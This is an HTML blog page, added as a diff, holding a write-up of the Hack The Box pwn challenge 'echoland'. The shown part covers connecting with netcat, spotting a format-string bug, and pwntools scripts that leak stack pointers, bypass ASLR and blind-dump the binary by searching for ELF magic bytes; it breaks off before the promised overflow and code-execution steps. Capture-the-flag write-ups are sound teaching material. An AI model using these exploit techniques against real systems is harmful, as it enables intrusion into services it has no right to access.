@@ -1,0 +1,623 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="详细过程及exp0. Connect to the binary:The only information provided with this challenge was an IP address and port number.You can connect to the binary using for example netcat as below: 12345678910111213┌">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hack-The-Box-pwn-challenge[echoland]">
+<meta property="og:url" content="https://fdlucifer.github.io/2021/12/11/echoland/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="详细过程及exp0. Connect to the binary:The only information provided with this challenge was an IP address and port number.You can connect to the binary using for example netcat as below: 12345678910111213┌">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/echoland.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/echoland1.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/echoland2.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/echoland3.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/echoland4.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/echoland5.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/echoland6.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/echoland7.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/echoland8.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/echoland9.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/echoland10.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/echoland11.jpg">
+<meta property="article:published_time" content="2021-12-11T07:21:58.000Z">
+<meta property="article:modified_time" content="2021-12-11T16:41:23.032Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/echoland.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2021/12/11/echoland/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2021/12/11/echoland/","path":"2021/12/11/echoland/","title":"Hack-The-Box-pwn-challenge[echoland]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Hack-The-Box-pwn-challenge[echoland] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B%E5%8F%8Aexp"><span class="nav-number">1.</span> <span class="nav-text">详细过程及exp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0-Connect-to-the-binary"><span class="nav-number">1.1.</span> <span class="nav-text">0. Connect to the binary:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Spot-the-first-vulnerability-%E2%80%94-Format-String"><span class="nav-number">1.2.</span> <span class="nav-text">1. Spot the first vulnerability — Format String:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Blind-Format-String-%E2%80%94-finding-magic-bytes"><span class="nav-number">1.3.</span> <span class="nav-text">2. Blind Format String — finding magic bytes:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Blind-Format-String-%E2%80%94-dumping-the-binary"><span class="nav-number">1.4.</span> <span class="nav-text">3. Blind Format String — dumping the binary:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-Reverse-the-leaked-binary"><span class="nav-number">1.5.</span> <span class="nav-text">4. Reverse the leaked binary:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-Get-the-target-libc"><span class="nav-number">1.6.</span> <span class="nav-text">5. Get the target libc:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-Spot-the-second-vulnerability-%E2%80%94-buffer-overflow"><span class="nav-number">1.7.</span> <span class="nav-text">6. Spot the second vulnerability — buffer overflow:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-Get-the-RCE-%E2%80%94-calculate-one-gadget"><span class="nav-number">1.8.</span> <span class="nav-text">7. Get the RCE — calculate one_gadget:</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%91%98%E8%87%AA-%E8%87%B4%E6%95%AC%E5%8E%9F%E4%BD%9C-%E2%80%A6%E2%80%A6"><span class="nav-number">2.</span> <span class="nav-text">摘自(致敬原作)……</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2021/12/11/echoland/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Hack-The-Box-pwn-challenge[echoland] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hack-The-Box-pwn-challenge[echoland]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-12-11 15:21:58" itemprop="dateCreated datePublished" datetime="2021-12-11T15:21:58+08:00">2021-12-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2021-12-12 00:41:23" itemprop="dateModified" datetime="2021-12-12T00:41:23+08:00">2021-12-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pwn/%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">逆向</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="详细过程及exp"><a href="#详细过程及exp" class="headerlink" title="详细过程及exp"></a>详细过程及exp</h2><h3 id="0-Connect-to-the-binary"><a href="#0-Connect-to-the-binary" class="headerlink" title="0. Connect to the binary:"></a>0. Connect to the binary:</h3><p>The only information provided with this challenge was an IP address and port number.<br>You can connect to the binary using for example netcat as below:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/challenge/pwn/echoland]</span><br><span class="line">└─<span class="comment"># nc 138.68.136.191 32714</span></span><br><span class="line"></span><br><span class="line">🦇 Inside the dark cave. 🦇</span><br><span class="line">1. Scream.</span><br><span class="line">2. Run outside.</span><br><span class="line">&gt; HELLO</span><br><span class="line">HELLO</span><br><span class="line"></span><br><span class="line">1. Scream.</span><br><span class="line">2. Run outside.</span><br><span class="line">&gt; asd</span><br><span class="line">asd</span><br></pre></td></tr></table></figure>
+
+<p>Typing HELLO or asd resulting in the same value echoed back.<br>Another option is to (1) Scream…</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. Scream.</span><br><span class="line">2. Run outside.</span><br><span class="line">&gt; 1</span><br><span class="line">&gt;&gt; AAAAAAA</span><br><span class="line">Your friend did not recognize you and ran the other way!</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<p>… but nobody will hear you :)</p>
+<p>The last option is to (2) Run outside. but it looks like an <span class="exturl" data-url="aHR0cHM6Ly9jd2UubWl0cmUub3JnL2RhdGEvZGVmaW5pdGlvbnMvODM1Lmh0bWw=">infinite loop<i class="fa fa-external-link-alt"></i></span>.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">🦇 Inside the dark cave. 🦇</span><br><span class="line">1. Scream.</span><br><span class="line">2. Run outside.</span><br><span class="line">&gt; 2</span><br><span class="line">2</span><br><span class="line"></span><br><span class="line">1. Scream.</span><br><span class="line">2. Run outside.</span><br><span class="line">&gt; 2</span><br><span class="line">2</span><br><span class="line"></span><br><span class="line">1. Scream.</span><br><span class="line">2. Run outside.</span><br><span class="line">&gt; 2</span><br><span class="line">2</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-Spot-the-first-vulnerability-—-Format-String"><a href="#1-Spot-the-first-vulnerability-—-Format-String" class="headerlink" title="1. Spot the first vulnerability — Format String:"></a>1. Spot the first vulnerability — Format String:</h3><p>Simple check with %p as an input leaked some data from the stack and %s crashed the binary.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. Scream.</span><br><span class="line">2. Run outside.</span><br><span class="line">&gt; %p--%p--%p</span><br><span class="line">0x6e--0xfffffff4--0x10</span><br><span class="line"></span><br><span class="line">1. Scream.</span><br><span class="line">2. Run outside.</span><br><span class="line">&gt; %s</span><br><span class="line">/home/ctf/run_challenge.sh: line 2:    31 Segmentation fault      ./echoland</span><br></pre></td></tr></table></figure>
+
+<p>You can use Format String vulnerability to your advantage and leak the pointers from binary using %p to get a general overview of the application.</p>
+<ul>
+<li>dumpbinary.py</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from struct import *</span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;error&#x27;</span></span><br><span class="line">context.update(<span class="built_in">arch</span> = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">ip, port = <span class="string">&quot;138.68.136.191:32714&quot;</span>.<span class="built_in">split</span>(<span class="string">&quot;:&quot;</span>)</span><br><span class="line"></span><br><span class="line">def leak_pointers_from_stack(ip,port):</span><br><span class="line">    <span class="string">&#x27;&#x27;</span><span class="string">&#x27;Format string - leak pointers to get the libc/main address and architecture.&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(0,20):</span><br><span class="line">        try:</span><br><span class="line">            p = remote(ip,port)</span><br><span class="line">            p.sendline(<span class="string">&quot;%&#123;&#125;<span class="variable">$p</span>&quot;</span>.format(i).encode()) </span><br><span class="line">            <span class="built_in">sleep</span>(0.2)</span><br><span class="line">            leak = p.recv()</span><br><span class="line">            x =str(i) + <span class="string">&quot; : &quot;</span> + leak.decode().<span class="built_in">split</span>(<span class="string">&quot;&gt;&quot;</span>)[1].<span class="built_in">split</span>(<span class="string">&quot;\x0a\x0a&quot;</span>)[0]</span><br><span class="line">            <span class="built_in">print</span>(x)</span><br><span class="line">            p.close()</span><br><span class="line">        except:</span><br><span class="line">            p.close()</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line">leak_pointers_from_stack(ip,port)</span><br></pre></td></tr></table></figure>
+
+<p>As you can see below, on the target machine there is x64 architecture, ASLR being on, we can leak pointer to the main module at the 12th offset and pointer from libc at the 13th position:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/challenge/pwn/echoland]</span><br><span class="line">└─<span class="comment"># python3 dumpbinary.py </span></span><br><span class="line">0 :  %0<span class="variable">$p</span></span><br><span class="line">1 :  0x6e</span><br><span class="line">2 :  0xfffffff4</span><br><span class="line">3 :  0x10</span><br><span class="line">4 :  0x1d</span><br><span class="line">5 :  0x7f2fa48984c0</span><br><span class="line">6 :  0x7ffd57971488</span><br><span class="line">7 :  0x100000000</span><br><span class="line">8 :  0xa70243825</span><br><span class="line">9 :  (nil)</span><br><span class="line">10 :  0x7fff00000000</span><br><span class="line">11 :  0x100000000</span><br><span class="line">12 :  0x561b128fa400</span><br><span class="line">13 :  0x7f73669d5bf7</span><br><span class="line">14 :  0x1</span><br><span class="line">15 :  0x7ffdd033d9c8</span><br><span class="line">16 :  0x100008000</span><br><span class="line">17 :  0x5555abc312ef</span><br><span class="line">18 :  (nil)</span><br><span class="line">19 :  0xe5eeacab581ae7b3</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-Blind-Format-String-—-finding-magic-bytes"><a href="#2-Blind-Format-String-—-finding-magic-bytes" class="headerlink" title="2. Blind Format String — finding magic bytes:"></a>2. Blind Format String — finding magic bytes:</h3><p>In order to dump binary code, you have to first find any pointer from the main module and it was shown above.</p>
+<p>Then you have to automatically grab this pointer for further exploitation using the below function which returns leaked main address — thus bypassing ASLR:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def leak_pointer_to_main():</span><br><span class="line">    <span class="string">&#x27;&#x27;</span><span class="string">&#x27;12th pointer is one from the main()&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">    p.sendline(b<span class="string">&quot;%12<span class="variable">$p</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">sleep</span>(1)</span><br><span class="line">    p.recvuntil(b<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    leak_all = p.recv()</span><br><span class="line">    leak = leak_all.decode().<span class="built_in">split</span>(<span class="string">&quot;\n&quot;</span>)[0]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Leaked main address: &quot;</span> + leak)</span><br><span class="line">    <span class="built_in">return</span> int(leak,16)</span><br></pre></td></tr></table></figure>
+
+<p>Then you have to subtract some bytes till you find <span class="exturl" data-url="aHR0cHM6Ly91bml4LnN0YWNrZXhjaGFuZ2UuY29tL3F1ZXN0aW9ucy8xNTMzNTIvd2hhdC1pcy1lbGYtbWFnaWM=">ELF magic bytes<i class="fa fa-external-link-alt"></i></span>.</p>
+<p>This is an important step, because you should dump the binary from the ELF header segment.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">def search_elf_magic_bytes(leaked_main,addr):</span><br><span class="line">    <span class="string">&#x27;&#x27;</span><span class="string">&#x27;Search through the process memory to find ELF magic bytes: \x7fELF.&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        leak_part = b<span class="string">&quot;%9<span class="variable">$sEOF</span>&quot;</span> + b<span class="string">&quot;\x00&quot;</span></span><br><span class="line">        try:</span><br><span class="line">            p.sendline(leak_part + p64(leaked_main + addr))</span><br><span class="line">            resp = p.recvuntil(b<span class="string">&quot;1. Scream.\n2. Run outside.\n&gt; &quot;</span>)</span><br><span class="line">            leak = resp.split(b<span class="string">&quot;EOF&quot;</span>)[0] + b<span class="string">&quot;\x00&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Deferenced pointer: &quot;</span> + leak.decode(<span class="string">&quot;unicode_escape&quot;</span>))   </span><br><span class="line">            <span class="keyword">if</span> b<span class="string">&quot;\x7FELF&quot;</span> <span class="keyword">in</span> leak:</span><br><span class="line">                magic_bytes = leaked_main + addr</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;MAGIC BYTES FOUND @: &quot;</span> + hex(magic_bytes))</span><br><span class="line">                <span class="built_in">return</span> magic_bytes, False</span><br><span class="line">                <span class="built_in">break</span></span><br><span class="line">            addr -=0x100</span><br><span class="line">        except:</span><br><span class="line">            addr -=0x100</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="built_in">return</span> addr, True</span><br><span class="line"><span class="comment"># Find ELF magic bytes =&gt; start_main_address</span></span><br><span class="line">elf_found=True</span><br><span class="line">addr = 0</span><br><span class="line">leaked_main = 0</span><br><span class="line"><span class="keyword">while</span> elf_found:</span><br><span class="line">    p = remote(ip,port)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;CURRENT ADDRESS = &quot;</span> + hex(addr))</span><br><span class="line">    leaked_main = leak_pointer_to_main() + addr</span><br><span class="line">    addr, elf_found = search_elf_magic_bytes(leaked_main,addr)</span><br><span class="line">start_main_addr = addr</span><br></pre></td></tr></table></figure>
+
+<p>The above function search_elf_magic_bytes is very simple:</p>
+<ol>
+<li>It connects to the target binary at line 62 until it does not find ELF magic bytes while elf_found — 61st line.</li>
